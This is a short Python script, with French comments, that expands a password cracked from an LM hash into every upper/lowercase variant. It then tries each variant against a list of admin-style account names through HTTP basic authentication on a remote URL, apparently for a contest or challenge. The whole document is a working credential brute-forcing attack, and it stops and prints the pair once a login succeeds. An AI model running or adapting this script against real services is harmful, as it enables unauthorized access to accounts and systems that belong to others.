import itertools
import sys

import requests


# liste de comptes utilisables (?)
accounts = ['admin', 'Admin', 'administrator', 'root', '4021221', '4dmin']

# password auquel est rattaché le hash
cracked_lm = 'p4ssword!'

# liste de passwords généré depuis le cracked_lm
passwords = []

# link to the site
link = 'https://room362.com/contest/source'

# counter attempts
counter = 0

passwords_gen = itertools.product(*zip(cracked_lm.lower(), cracked_lm.upper()))
#test = zip(cracked_lm.lower(), cracked_lm.upper())

#print("list pair with zip : ", list(zip(cracked_lm.lower(), cracked_lm.upper())))
#print("list: ", list(passwords_gen))
#print("enumerate : ", list(enumerate(passwords_gen)))

print("cracked pass minuscule: ", cracked_lm.lower())
print("cracked_pass majuscule: ", cracked_lm.upper())

# concatenate generated tuple in passwords list  and append the results to a new password list
for password in passwords_gen:
  passwords.append(''.join(password))
  print(passwords)

# go through the accounts list
for account in accounts:

    # go through the password list previously generated
    for p in passwords:
        print(p)

        # test link to try
        test = requests.get(link, auth=(account, p))

        # check if authentication is valid ; otherwise shows attempts count
        if test.status_code is 200:
            print(f"Found {test.status_code} valid status code for account : {account} \
            password : {p}. While requesting {link}.")
            print(f"account : {account}, password : {p}")
            sys.exit()
        else:
            print(f"{p} was ..Not good ; retrying.")
            counter += 1
            print(f"Try count : {counter}")
